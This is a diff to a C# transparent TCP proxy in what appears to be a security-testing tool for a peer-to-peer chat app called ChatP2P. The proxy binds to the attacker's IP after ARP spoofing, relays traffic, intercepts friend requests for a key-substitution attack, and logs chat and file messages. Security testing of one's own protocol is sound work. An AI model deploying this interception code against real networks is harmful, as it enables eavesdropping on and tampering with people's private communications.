@@ -1,24 +1,29 @@
 using System;
 using System.Net;
 using System.Net.Sockets;
+using System.Net.NetworkInformation;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Linq;
 using ChatP2P.SecurityTester.Models;
 using ChatP2P.SecurityTester.Crypto;
+using ChatP2P.SecurityTester.Core;
 
 namespace ChatP2P.SecurityTester.Network
 {
     /// <summary>
     /// 🕷️ Proxy TCP transparent pour MITM réel - Interception et modification packets ChatP2P
     /// </summary>
-    public class TCPProxy
+    public class TCPProxy : IDisposable
     {
         private TcpListener? _proxyListener;
         private bool _isRunning = false;
         private readonly KeySubstitutionAttack _keyAttack;
         private CancellationTokenSource? _cancellationToken;
+        private readonly List<TcpClient> _activeConnections = new();
+        private readonly object _connectionsLock = new();
+        private bool _disposed = false;
 
         public event Action<string>? LogMessage;
         public event Action<AttackResult>? PacketModified;
@@ -31,26 +36,38 @@ namespace ChatP2P.SecurityTester.Network
         /// <summary>
         /// 🚀 Démarre proxy TCP transparent avec mapping automatique des ports ChatP2P
         /// </summary>
-        public async Task<bool> StartProxy(int listenPort, string targetHost, int targetPort)
+        public async Task<bool> StartProxy(int listenPort, string targetHost, int targetPort, IPAddress? listenAddress = null)
         {
             try
             {
-                // Obtenir IP locale pour logs et configuration
-                var localIP = GetLocalIPAddress();
+                // 🎯 Utiliser IP fournie ou détecter automatiquement
+                IPAddress bindAddress;
+                if (listenAddress != null)
+                {
+                    bindAddress = listenAddress;
+                    LogMessage?.Invoke($"🎯 FORCED IP BINDING: {bindAddress}:{listenPort}");
+                }
+                else
+                {
+                    // 🚨 ARCHITECTURE VM FIXÉE: Écouter sur IP attaquant (portproxy ne marche pas)
+                    var attackerIP = GetLocalIPAddress();
+                    bindAddress = IPAddress.Parse(attackerIP);  // IP attaquant directe
+                    LogMessage?.Invoke($"🔧 AUTO-DETECTED IP: {bindAddress}:{listenPort}");
+                }
 
-                // 🚨 ARCHITECTURE CORRIGÉE: Écoute sur localhost avec portproxy transparent
-                LogMessage?.Invoke($"🔧 ARCHITECTURE CORRECTE: Windows Portproxy + TCPProxy localhost");
-                LogMessage?.Invoke($"📡 FLOW: ARP-Spoof → {localIP}:{listenPort} → portproxy → 127.0.0.1:{listenPort} → {targetHost}:{targetPort}");
+                // 🚨 ARCHITECTURE VM DIRECTE: Plus de portproxy, écoute directe
+                LogMessage?.Invoke($"🔧 ARCHITECTURE VM DIRECTE: TCPProxy {bindAddress}:{listenPort}");
+                LogMessage?.Invoke($"📡 FLOW: Victime → ARP-Spoof → TCPProxy({bindAddress}:{listenPort}) → {targetHost}:{targetPort}");
 
-                _proxyListener = new TcpListener(IPAddress.Any, listenPort);
+                _proxyListener = new TcpListener(bindAddress, listenPort);
                 _proxyListener.Start();
                 _isRunning = true;
                 _cancellationToken = new CancellationTokenSource();
 
-                LogMessage?.Invoke($"🕷️ Proxy TCP MITM: 127.0.0.1:{listenPort} → {targetHost}:{targetPort}");
-                LogMessage?.Invoke($"🎯 Architecture: ARP-Spoof → Portproxy({localIP}:{listenPort}) → TCPProxy(127.0.0.1:{listenPort}) → Relay({targetHost}:{targetPort})");
-                LogMessage?.Invoke($"📡 En attente connexions via Windows portproxy transparent...");
-                LogMessage?.Invoke($"🔧 DEBUG: TcpListener créé sur 127.0.0.1:{listenPort}");
+                LogMessage?.Invoke($"🕷️ Proxy TCP MITM: {bindAddress}:{listenPort} → {targetHost}:{targetPort}");
+                LogMessage?.Invoke($"🎯 Architecture: Victime → ARP-Spoof → TCPProxy({bindAddress}:{listenPort}) → Relay({targetHost}:{targetPort})");
+                LogMessage?.Invoke($"📡 En attente connexions directes via ARP spoofing...");
+                LogMessage?.Invoke($"🔧 DEBUG: TcpListener créé sur {bindAddress}:{listenPort}");
                 LogMessage?.Invoke($"🔧 DEBUG: _isRunning={_isRunning}, Task.Run lancé pour AcceptConnections");
 
                 // Test si le port est bien ouvert
@@ -85,21 +102,41 @@ namespace ChatP2P.SecurityTester.Network
 
                 while (_isRunning && !cancellationToken.IsCancellationRequested)
                 {
-                    LogMessage?.Invoke($"🔧 DEBUG: Boucle accept - en attente connexion...");
+                    LogMessage?.Invoke($"🔧 DEBUG: Boucle accept iteration - en attente connexion...");
+                    LogMessage?.Invoke($"🔧 DEBUG: _proxyListener state: {_proxyListener?.Server?.IsBound}");
 
                     try
                     {
+                        LogMessage?.Invoke($"🔧 DEBUG: Calling AcceptTcpClientAsync()...");
                         var clientSocket = await _proxyListener!.AcceptTcpClientAsync();
                         LogMessage?.Invoke($"📡 CONNEXION REÇUE: {clientSocket.Client.RemoteEndPoint}");
                         LogMessage?.Invoke($"🔧 DEBUG: Client connecté, lancement HandleConnection");
 
-                        // Traiter chaque connexion en parallèle
-                        _ = Task.Run(async () => await HandleConnection(clientSocket, targetHost, targetPort, cancellationToken));
+                        // Traiter chaque connexion en parallèle avec tracking
+                        lock (_connectionsLock)
+                        {
+                            _activeConnections.Add(clientSocket);
+                        }
+                        _ = Task.Run(async () => {
+                            try
+                            {
+                                await HandleConnection(clientSocket, targetHost, targetPort, cancellationToken);
+                            }
+                            finally
+                            {
+                                lock (_connectionsLock)
+                                {
+                                    _activeConnections.Remove(clientSocket);
+                                }
+                            }
+                        });
                     }
                     catch (Exception ex)
                     {
-                        LogMessage?.Invoke($"❌ Erreur AcceptTcpClientAsync: {ex.Message}");
+                        LogMessage?.Invoke($"❌ ERREUR CRITIQUE AcceptTcpClientAsync: {ex.Message}");
                         LogMessage?.Invoke($"🔧 DEBUG: Exception type: {ex.GetType().Name}");
+                        LogMessage?.Invoke($"🔧 DEBUG: Stack trace: {ex.StackTrace}");
+                        LogMessage?.Invoke($"🔧 DEBUG: Proxy binding failed, stopping accept loop");
                         break;
                     }
                 }
@@ -128,8 +165,8 @@ namespace ChatP2P.SecurityTester.Network
                 LogMessage?.Invoke($"🔧 DEBUG: Tentative connexion vers {targetHost}:{dynamicTargetPort}");
 
                 relaySocket = new TcpClient();
-                relaySocket.ReceiveTimeout = 120000; // 2 minutes (gros JSON)
-                relaySocket.SendTimeout = 120000;    // 2 minutes
+                relaySocket.ReceiveTimeout = 600000; // 10 minutes - connexion persistante
+                relaySocket.SendTimeout = 600000;    // 10 minutes
                 relaySocket.ReceiveBufferSize = 1048576; // 1MB buffer
                 relaySocket.SendBufferSize = 1048576;    // 1MB buffer
                 relaySocket.NoDelay = true;             // Désactive Nagle Algorithm (performance)
@@ -144,8 +181,8 @@ namespace ChatP2P.SecurityTester.Network
                 // ⚡ Configuration optimisée pour gros JSON (search peers)
                 clientSocket.ReceiveBufferSize = 1048576; // 1MB
                 clientSocket.SendBufferSize = 1048576;    // 1MB
-                clientSocket.ReceiveTimeout = 120000;     // 2 minutes
-                clientSocket.SendTimeout = 120000;        // 2 minutes
+                clientSocket.ReceiveTimeout = 600000;     // 10 minutes - connexion persistante
+                clientSocket.SendTimeout = 600000;        // 10 minutes
                 clientSocket.NoDelay = true;              // Performance optimale
                 clientSocket.LingerState = new System.Net.Sockets.LingerOption(false, 0);
 
@@ -170,8 +207,15 @@ namespace ChatP2P.SecurityTester.Network
             }
             finally
             {
-                clientSocket?.Close();
-                relaySocket?.Close();
+                try
+                {
+                    clientSocket?.Close();
+                    relaySocket?.Close();
+                }
+                catch (Exception ex)
+                {
+                    LogMessage?.Invoke($"⚠️ Error closing connections: {ex.Message}");
+                }
                 LogMessage?.Invoke("🔚 Tunnel fermé");
             }
         }
@@ -183,9 +227,22 @@ namespace ChatP2P.SecurityTester.Network
                 var buffer = new byte[1048576]; // 1MB buffer pour gros JSON (search peers)
                 bool isSearchConnection = false;
 
-                while (!cancellationToken.IsCancellationRequested)
+                using var combinedCts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+                combinedCts.CancelAfter(TimeSpan.FromMinutes(5)); // Max 5 minutes per connection
+
+                while (!combinedCts.Token.IsCancellationRequested)
                 {
-                    int bytesRead = await source.ReadAsync(buffer, 0, buffer.Length, cancellationToken);
+                    int bytesRead;
+                    try
+                    {
+                        bytesRead = await source.ReadAsync(buffer, 0, buffer.Length, combinedCts.Token);
+                    }
+                    catch (OperationCanceledException) when (combinedCts.Token.IsCancellationRequested)
+                    {
+                        LogMessage?.Invoke($"⏱️ Timeout {direction}: Max connection time reached");
+                        break;
+                    }
+
                     if (bytesRead == 0)
                     {
                         // ✅ Connexion fermée proprement côté serveur (normal pour search)
@@ -198,6 +255,23 @@ namespace ChatP2P.SecurityTester.Network
 
                     var data = new byte[bytesRead];
                     Array.Copy(buffer, data, bytesRead);
+
+                    // 🔍 DEBUGGING: Log premiers bytes pour diagnostiquer
+                    if (bytesRead > 0)
+                    {
+                        var hexDump = BitConverter.ToString(data, 0, Math.Min(16, bytesRead));
+                        LogMessage?.Invoke($"📊 {direction}: {bytesRead} bytes - Hex: {hexDump}");
+
+                        try
+                        {
+                            var preview = Encoding.UTF8.GetString(data, 0, Math.Min(100, bytesRead));
+                            LogMessage?.Invoke($"📝 {direction}: Text preview: {preview.Replace("\r", "\\r").Replace("\n", "\\n")}");
+                        }
+                        catch
+                        {
+                            LogMessage?.Invoke($"📊 {direction}: Binary data (non-UTF8)");
+                        }
+                    }
 
                     // 🔍 Détecter si c'est une connexion search AVANT modification
                     byte[] finalData = data;
@@ -238,8 +312,16 @@ namespace ChatP2P.SecurityTester.Network
                         finalData = data;
                     }
 
-                    await destination.WriteAsync(finalData, 0, finalData.Length, cancellationToken);
-                    await destination.FlushAsync(cancellationToken);
+                    try
+                    {
+                        await destination.WriteAsync(finalData, 0, finalData.Length, combinedCts.Token);
+                        await destination.FlushAsync(combinedCts.Token);
+                    }
+                    catch (OperationCanceledException) when (combinedCts.Token.IsCancellationRequested)
+                    {
+                        LogMessage?.Invoke($"⏱️ Write timeout {direction}: Cancelling connection");
+                        break;
+                    }
                 }
             }
             catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
@@ -310,8 +392,10 @@ namespace ChatP2P.SecurityTester.Network
                     LogMessage?.Invoke($"🔍 DEBUG {direction}: {preview}");
                 }
 
-                // 🔍 Détecter friend requests (patterns ChatP2P exacts)
-                if ((content.Contains("FRIEND_REQ:") || content.Contains("FRIEND_REQ_DUAL:") ||
+                // 🔍 Détecter friend requests JSON API
+                if ((content.Contains("\"Action\":\"receive_friend_request\"") ||
+                     content.Contains("\"Action\":\"send_friend_request\"") ||
+                     content.Contains("FRIEND_REQ:") || content.Contains("FRIEND_REQ_DUAL:") ||
                      content.Contains("SECURE_FRIEND_REQUEST")) && direction == "Client→Relay")
                 {
                     LogMessage?.Invoke($"🎯 FRIEND REQUEST INTERCEPTÉE!");
@@ -391,8 +475,9 @@ namespace ChatP2P.SecurityTester.Network
                     }
                 }
 
-                // 🔍 Logger autres trafics intéressants
-                if (content.Contains("CHAT_MSG") || content.Contains("FILE_CHUNK"))
+                // 🔍 Logger autres trafics intéressants (JSON API + anciens formats)
+                if (content.Contains("\"Action\":\"send_message\"") || content.Contains("\"Action\":\"handle_file_message\"") ||
+                    content.Contains("CHAT_MSG") || content.Contains("FILE_CHUNK"))
                 {
                     LogMessage?.Invoke($"📨 Trafic ChatP2P: {direction} - {content.Substring(0, Math.Min(50, content.Length))}...");
                 }
@@ -415,21 +500,6 @@ namespace ChatP2P.SecurityTester.Network
             }
         }
 
-        public void StopProxy()
-        {
-            try
-            {
-                _isRunning = false;
-                _cancellationToken?.Cancel();
-                _proxyListener?.Stop();
-
-                LogMessage?.Invoke("⏹️ Proxy TCP arrêté");
-            }
-            catch (Exception ex)
-            {
-                LogMessage?.Invoke($"❌ Erreur arrêt proxy: {ex.Message}");
-            }
-        }
 
         public bool IsRunning => _isRunning;
 
@@ -465,6 +535,44 @@ namespace ChatP2P.SecurityTester.Network
             }
         }
 
+
+
+        private IPAddress GetListenerAddress(IPAddress? listenAddress)
+        {
+            if (listenAddress != null)
+            {
+                return listenAddress;
+            }
+
+            if (IPAddress.TryParse(SecurityTesterConfig.AttackerIP, out var attackerIp) &&
+                attackerIp.AddressFamily == AddressFamily.InterNetwork &&
+                IsLocalIPAddress(attackerIp))
+            {
+                LogMessage?.Invoke($"[PORTPROXY] Binding TCP proxy on attacker IP {attackerIp}");
+                return attackerIp;
+            }
+
+            LogMessage?.Invoke($"[PORTPROXY] Attacker IP '{SecurityTesterConfig.AttackerIP}' not assigned locally. Binding on 0.0.0.0");
+            return IPAddress.Any;
+        }
+
+        private static bool IsLocalIPAddress(IPAddress address)
+        {
+            try
+            {
+                var assignedAddresses = NetworkInterface.GetAllNetworkInterfaces()
+                    .Where(nic => nic.OperationalStatus == OperationalStatus.Up)
+                    .SelectMany(nic => nic.GetIPProperties().UnicastAddresses)
+                    .Select(uni => uni.Address);
+
+                return assignedAddresses.Any(ip => ip.Equals(address));
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
         private string GetLocalIPAddress()
         {
             try
@@ -482,6 +590,75 @@ namespace ChatP2P.SecurityTester.Network
             {
                 return "localhost";
             }
+        }
+
+        /// <summary>
+        /// 🛑 Arrête le proxy TCP proprement
+        /// </summary>
+        public void StopProxy()
+        {
+            try
+            {
+                LogMessage?.Invoke("⏹️ Stopping TCP Proxy...");
+
+                _isRunning = false;
+                _cancellationToken?.Cancel();
+
+                // Close all active connections
+                lock (_connectionsLock)
+                {
+                    LogMessage?.Invoke($"🔄 Closing {_activeConnections.Count} active connections...");
+                    foreach (var connection in _activeConnections.ToList())
+                    {
+                        try
+                        {
+                            connection?.Close();
+                        }
+                        catch (Exception ex)
+                        {
+                            LogMessage?.Invoke($"⚠️ Error closing connection: {ex.Message}");
+                        }
+                    }
+                    _activeConnections.Clear();
+                }
+
+                // Stop listener
+                if (_proxyListener != null)
+                {
+                    _proxyListener.Stop();
+                    LogMessage?.Invoke("✅ TCP Proxy listener stopped");
+                }
+
+                LogMessage?.Invoke("⏹️ TCP Proxy stopped successfully");
+            }
+            catch (Exception ex)
+            {
+                LogMessage?.Invoke($"❌ Error stopping TCP Proxy: {ex.Message}");
+            }
+        }
+
+        /// <summary>
+        /// 🗑️ Dispose pattern implementation
+        /// </summary>
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
+        {
+            if (!_disposed && disposing)
+            {
+                StopProxy();
+                _cancellationToken?.Dispose();
+                _disposed = true;
+            }
+        }
+
+        ~TCPProxy()
+        {
+            Dispose(false);
         }
     }
 }
